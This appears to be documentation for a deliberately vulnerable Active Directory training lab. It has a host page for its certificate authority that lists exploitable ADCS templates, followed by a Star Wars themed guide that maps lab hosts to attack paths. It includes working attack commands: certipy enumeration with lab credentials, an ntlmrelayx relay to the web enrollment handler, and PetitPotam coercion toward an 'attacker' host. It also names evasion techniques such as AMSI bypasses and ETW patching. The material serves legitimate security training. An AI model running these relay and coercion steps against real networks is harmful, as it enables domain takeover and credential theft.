# endor.empire.local — 10.10.0.12

Enterprise CA. Holds the templates that turn "domain user" into "Administrator with a TGT." Every ESC1..16 is reachable here.

## Listening ports

| Port | Proto | Service | Notes |
|---|---|---|---|
| 80 | TCP | IIS — ADCS Web Enrollment (`/certsrv`) | **HTTP only**, no EPA, NTLM + Basic ⇒ **ESC8** |
| 135 | TCP | RPC endpoint mapper | `ICertPassage` (ESC11 candidate) |
| 389/636 | TCP | LDAP (domain-joined) | |
| 445 | TCP | SMB | signing default |
| 3389 | TCP | RDP | |
| 5985 | TCP | WinRM | Ansible channel |

## ADCS templates published (the high-value ones)

| Template | Vuln | Why |
|---|---|---|
| `ESC1` | ESC1 | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` + Client Auth EKU + Domain Users enroll + no manager approval |
| `ESC2` | ESC2 | "Any Purpose" EKU |
| `ESC3` | ESC3 | Enrollment Agent EKU + enroll-on-behalf-of |
| `ESC4` | ESC4 | Domain Users have `GenericAll` on the template object |
| `ESC6_Vulnerable` | ESC6 | CA-wide `EDITF_ATTRIBUTESUBJECTALTNAME2` accepts user-supplied SAN |
| `WebServer` (ESC8) | ESC8 | Domain Users enroll via web; combined with HTTP+NTLM = relay |
| `ESC9` | ESC9 | `CT_FLAG_NO_SECURITY_EXTENSION` (no user-SID extension) |
| `ESC10` | ESC10 | Strong cert binding loose (EditFlags 0x40000) |
| `ESC13` | ESC13 | Issuance policy OID linked to Domain Admins via `msDS-OIDToGroupLink` |
| `ESC14` | ESC14 | `developer1` has WriteProperty on `altSecurityIdentities` of Administrator |
| `ESC15` | ESC15 / CVE-2024-49019 | WebServer schema v1 enrollable by users (EKUwu) |

CA-wide: `DisableExtensionList` includes `1.3.6.1.4.1.311.25.2` → ESC16 (no SID extension on *any* issued cert).

## Web enrollment URLs to know

```
http://10.10.0.12/certsrv/                          # web enrollment portal (NTLM auth)
http://10.10.0.12/certsrv/certfnsh.asp              # request handler
http://10.10.0.12/ADPolicyProvider_CEP_*/service.svc/CEP   # CEP
http://10.10.0.12/corp-CA-CA_CES_*/service.svc/CES         # CES
```

## Minimum enum sweep

```bash
CA=10.10.0.12
nmap -p 80,135,389,445,3389,5985 -sV $CA
curl -sk http://$CA/certsrv/                                 # 401 NTLM
# Authenticated:
certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -enabled -stdout
# ESC8 path (no creds needed if you have coercion):
ntlmrelayx.py -t http://$CA/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py -d empire.local -u peter.parker -p 'EmpireLab2024!' attacker 10.10.0.10
```

## Forward to

CRED-020 (PetitPotam → ADCS), CRED-024 (Certifried), DF-011..022 (ESC1..16), PER-023 (Golden Certificate after CA private key export).

---

# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping

Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.

## The Galactic Topology

The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.

```mermaid
graph TD
    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;

    subgraph The Galactic Empire (empire.local)
        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
        Coruscant -- "Imperial Command" --> DeathStar
        Coruscant --- Scarif
        Coruscant --- Kamino
        Coruscant --- Endor
        Coruscant --- Mandalore
    end

    subgraph The Rebel Alliance (rebel.local)
        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
    end

    subgraph The Trade Federation (trade.corp)
        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
    end

    Coruscant <-->|Espionage / External Trust| Yavin4
    Coruscant <-->|Treaty / Forest Trust| Neimoidia
```

## Infrastructure Mapping

Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:

### 1. The Core Domains
* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.

### 2. High-Value Targets (Servers)
* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.

### 3. Attack Paths and Tactics
* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.

## The Hacker's Code (Sith vs Jedi)
As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?

* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).

## Flag Locations (Holocrons)
Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 

**Remember:** 
* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.

May the Force be with you as you conquer the EMPIRE AD!
